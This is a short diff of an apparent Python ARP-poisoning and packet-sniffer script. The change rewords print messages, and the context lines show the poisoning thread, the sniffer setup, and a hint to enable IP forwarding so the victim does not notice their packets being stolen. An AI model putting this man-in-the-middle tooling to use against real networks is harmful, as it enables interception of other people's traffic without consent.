@@ -93,10 +93,9 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
 
 ##################################### Start of Script #########################
-print "[ * ] Hope you remembered to turn ipv4 forwarding on so the user doesn't"
-print "[ * ] recognize a shitty internet connection when you steal their packets"
-print "[ * ] Hint: sudo sysctl -w net.ipv4.ip_forward=1"
-print ""
+print "[ ? ] Hope you remembered to turn ipv4 forwarding on so the user doesn't"
+print "[ ? ] recognize a shitty internet connection when you steal their packets"
+print "[ ? ] Hint: sudo sysctl -w net.ipv4.ip_forward=1"
 print ""
 print "[ * ] Setting up %s" % interface
 
@@ -109,7 +108,7 @@ target_mac = get_mac_wrapper(target_ip, "Target")
 poison_thread = threading.Thread(target= poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
 poison_thread.daemon = True
 poison_thread.start()
-
+print ""
 try:
     print "[ * ] Starting sniffer for %d packets" % packet_count
     bpf_filter = "ip host %s" % target_ip
